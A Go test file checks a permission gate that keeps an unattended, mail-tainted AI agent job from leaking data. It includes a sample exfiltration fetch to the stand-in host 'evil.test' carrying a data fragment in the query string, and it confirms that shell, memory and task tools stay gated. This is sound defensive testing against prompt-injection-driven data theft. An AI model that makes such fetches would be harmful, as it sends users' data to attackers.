package runner

import (
	"context"
	"encoding/json"
	"strconv"
	"testing"

	"github.com/FacileStudio/Bulle/apps/api/internal/store"
	"github.com/FacileStudio/nacelle"
)

func TestAJobRunFollowsResultLinksAndWritesArtifactsButKeepsTheShellGated(t *testing.T) {
	g := mailTaintedGate()
	g.unattend(store.ChannelCron)
	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "sonar_search"}, Result: linkTable()})
	for i, char := range "FR76X" {
		if g.need(sonarFetchTool, urlInput("https://evil.test/"+strconv.Itoa(i+1)+"/"+string(char)), true) != askNo {
			t.Fatalf("a job run must follow link %d from a result unasked", i+1)
		}
	}
	if !g.asks(sonarFetchTool, urlInput("https://evil.test/?d=FR76")) {
		t.Fatal("a job run must still ask before a URL it never saw")
	}
	for _, tool := range artifactWrites {
		if g.asks(tool, json.RawMessage(`{"title":"x","content":"FR76"}`)) {
			t.Errorf("a job run must write %s unasked", tool)
		}
	}
	for _, tool := range []string{shellTool, memoryWriteTool, "opus_create_task"} {
		if !g.asks(tool, json.RawMessage(`{}`)) {
			t.Errorf("a job run must still ask before %s", tool)
		}
	}
}
